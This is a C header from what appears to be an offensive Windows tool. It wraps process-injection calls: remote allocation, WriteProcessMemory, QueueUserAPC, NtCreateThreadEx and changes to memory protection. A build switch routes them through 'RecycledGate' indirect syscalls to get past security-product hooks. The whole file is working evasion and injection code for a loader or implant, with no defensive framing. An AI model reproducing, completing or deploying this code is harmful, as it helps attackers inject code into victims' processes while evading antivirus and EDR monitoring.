#ifndef MANA_API_WRAPPER_H
#define MANA_API_WRAPPER_H

#include <windows.h>
#include "typedef.h"
#include "Defines2.h"

// =============================================================================
// API MODE SELECTION
// =============================================================================
// USE_INDIRECT_SYSCALL  - RecycledGate indirect syscalls
// USE_WINAPI            - Standard Win32 API calls via Api table (default)
//
// Define via compiler: -DUSE_INDIRECT_SYSCALL or -DUSE_WINAPI
// =============================================================================

#ifdef USE_INDIRECT_SYSCALL
    #include "RecycledGate.h"
#endif

// =============================================================================
// Syscall Table for Indirect Syscalls
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

typedef struct _SYSCALL_TABLE {
    Syscall NtAllocateVirtualMemory;
    Syscall NtWriteVirtualMemory;
    Syscall NtProtectVirtualMemory;
    Syscall NtFreeVirtualMemory;
    Syscall NtCreateThreadEx;
    Syscall NtQueueApcThread;
    Syscall NtResumeThread;
    Syscall NtSuspendThread;
    Syscall NtClose;
    Syscall NtOpenProcess;
    Syscall NtWaitForSingleObject;
    Syscall NtTerminateProcess;
    BOOL    bInitialized;
} SYSCALL_TABLE, *PSYSCALL_TABLE;

extern SYSCALL_TABLE g_SyscallTable;

// Initialize all syscalls
BOOL InitSyscallTable();

#endif // USE_INDIRECT_SYSCALL

// =============================================================================
// API Initialization
// =============================================================================
static inline BOOL ManaApiInit()
{
#ifdef USE_INDIRECT_SYSCALL
    return InitSyscallTable();
#else
    return TRUE;  // Win32 API uses Api table, initialized elsewhere
#endif
}

// =============================================================================
// VIRTUAL ALLOC EX
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline PVOID ManaVirtualAllocEx(
    HANDLE hProcess,
    PVOID  lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
) {
    PVOID    BaseAddress = lpAddress;
    SIZE_T   RegionSize  = dwSize;
    NTSTATUS Status;
    
    PrepareSyscall(g_SyscallTable.NtAllocateVirtualMemory.dwSyscallNr, 
                   g_SyscallTable.NtAllocateVirtualMemory.pRecycledGate);
    
    Status = DoSyscall(hProcess, &BaseAddress, 0, &RegionSize, flAllocationType, flProtect);
    
    return NT_SUCCESS(Status) ? BaseAddress : NULL;
}

#else

#define ManaVirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect) \
    Api.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)

#endif

// =============================================================================
// WRITE PROCESS MEMORY
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline BOOL ManaWriteProcessMemory(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
) {
    NTSTATUS Status;
    SIZE_T   BytesWritten = 0;
    
    PrepareSyscall(g_SyscallTable.NtWriteVirtualMemory.dwSyscallNr,
                   g_SyscallTable.NtWriteVirtualMemory.pRecycledGate);
    
    Status = DoSyscall(hProcess, lpBaseAddress, (PVOID)lpBuffer, nSize, &BytesWritten);
    
    if (lpNumberOfBytesWritten)
        *lpNumberOfBytesWritten = BytesWritten;
    
    return NT_SUCCESS(Status);
}

#else

#define ManaWriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten) \
    Api.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)

#endif

// =============================================================================
// VIRTUAL PROTECT EX
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline BOOL ManaVirtualProtectEx(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
) {
    NTSTATUS Status;
    PVOID    BaseAddress = lpAddress;
    SIZE_T   RegionSize  = dwSize;
    ULONG    OldProtect  = 0;
    
    PrepareSyscall(g_SyscallTable.NtProtectVirtualMemory.dwSyscallNr,
                   g_SyscallTable.NtProtectVirtualMemory.pRecycledGate);
    
    Status = DoSyscall(hProcess, &BaseAddress, &RegionSize, flNewProtect, &OldProtect);
    
    if (lpflOldProtect)
        *lpflOldProtect = OldProtect;
    
    return NT_SUCCESS(Status);
}

#else

#define ManaVirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect) \
    Api.VirtualProtectEx(hProcess, lpAddress, dwSize, flNewProtect, lpflOldProtect)

#endif

// =============================================================================
// QUEUE USER APC
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline DWORD ManaQueueUserAPC(
    PAPCFUNC  pfnAPC,
    HANDLE    hThread,
    ULONG_PTR dwData
) {
    NTSTATUS Status;
    
    PrepareSyscall(g_SyscallTable.NtQueueApcThread.dwSyscallNr,
                   g_SyscallTable.NtQueueApcThread.pRecycledGate);
    
    // NtQueueApcThread(ThreadHandle, ApcRoutine, Arg1, Arg2, Arg3)
    Status = DoSyscall(hThread, (PVOID)pfnAPC, (PVOID)dwData, NULL, NULL);
    
    return NT_SUCCESS(Status) ? 1 : 0;
}
#else
#define ManaQueueUserAPC(pfnAPC, hThread, dwData) \
    Api.QueueUserAPC(pfnAPC, hThread, dwData)
#endif

// =============================================================================
// RESUME THREAD
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline DWORD ManaResumeThread(HANDLE hThread) {
    NTSTATUS Status;
    ULONG    PreviousSuspendCount = 0;
    
    PrepareSyscall(g_SyscallTable.NtResumeThread.dwSyscallNr,
                   g_SyscallTable.NtResumeThread.pRecycledGate);
    
    Status = DoSyscall(hThread, &PreviousSuspendCount);
    
    return NT_SUCCESS(Status) ? PreviousSuspendCount : (DWORD)-1;
}

#else

#define ManaResumeThread(hThread) Api.ResumeThread(hThread)

#endif

// =============================================================================
// CLOSE HANDLE
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline BOOL ManaCloseHandle(HANDLE hObject) {
    NTSTATUS Status;
    
    PrepareSyscall(g_SyscallTable.NtClose.dwSyscallNr,
                   g_SyscallTable.NtClose.pRecycledGate);
    
    Status = DoSyscall(hObject);
    
    return NT_SUCCESS(Status);
}

#else

#define ManaCloseHandle(hObject) Api.CloseHandle(hObject)

#endif

// =============================================================================
// TERMINATE PROCESS
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline BOOL ManaTerminateProcess(HANDLE hProcess, UINT uExitCode) {
    NTSTATUS Status;
    
    PrepareSyscall(g_SyscallTable.NtTerminateProcess.dwSyscallNr,
                   g_SyscallTable.NtTerminateProcess.pRecycledGate);
    
    Status = DoSyscall(hProcess, (NTSTATUS)uExitCode);
    
    return NT_SUCCESS(Status);
}

#else

#define ManaTerminateProcess(hProcess, uExitCode) Api.TerminateProcess(hProcess, uExitCode)

#endif


// =============================================================================
// ManaCreateRemoteThread - NtCreateThreadEx
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL
static inline HANDLE ManaCreateRemoteThread(
    HANDLE  hProcess,
    PVOID   lpStartAddress,
    PVOID   lpParameter
) {
    HANDLE hThread = NULL;
    
    PrepareSyscall(g_SyscallTable.NtCreateThreadEx.dwSyscallNr,
                   g_SyscallTable.NtCreateThreadEx.pRecycledGate);
    
    // NtCreateThreadEx(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle,
    //                  StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaxStackSize, AttributeList)
    NTSTATUS Status = DoSyscall(
        &hThread,                    // OUT ThreadHandle
        THREAD_ALL_ACCESS,           // DesiredAccess
        NULL,                        // ObjectAttributes
        hProcess,                    // ProcessHandle
        lpStartAddress,              // StartRoutine
        lpParameter,                 // Argument
        0,                           // CreateFlags (0 = start immediately)
        0,                           // ZeroBits
        0,                           // StackSize (0 = default)
        0,                           // MaxStackSize
        NULL                         // AttributeList
    );
    
    return NT_SUCCESS(Status) ? hThread : NULL;
}
#else
#define ManaCreateRemoteThread(hProcess, lpStartAddress, lpParameter) \
    Api.CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL)
#endif


// =============================================================================
// WAIT FOR SINGLE OBJECT
// =============================================================================
#ifdef USE_INDIRECT_SYSCALL

static inline DWORD ManaWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
    NTSTATUS       Status;
    LARGE_INTEGER  Timeout;
    PLARGE_INTEGER pTimeout = NULL;
    
    if (dwMilliseconds != INFINITE) {
        Timeout.QuadPart = -((LONGLONG)dwMilliseconds * 10000);
        pTimeout = &Timeout;
    }
    
    PrepareSyscall(g_SyscallTable.NtWaitForSingleObject.dwSyscallNr,
                   g_SyscallTable.NtWaitForSingleObject.pRecycledGate);
    
    Status = DoSyscall(hHandle, FALSE, pTimeout);
    
    if (NT_SUCCESS(Status))
        return WAIT_OBJECT_0;
    else if (Status == 0x00000102) // STATUS_TIMEOUT
        return WAIT_TIMEOUT;
    else
        return WAIT_FAILED;
}

#else

#define ManaWaitForSingleObject(hHandle, dwMilliseconds) Api.WaitForSingleObject(hHandle, dwMilliseconds)

#endif

#endif // MANA_API_WRAPPER_H
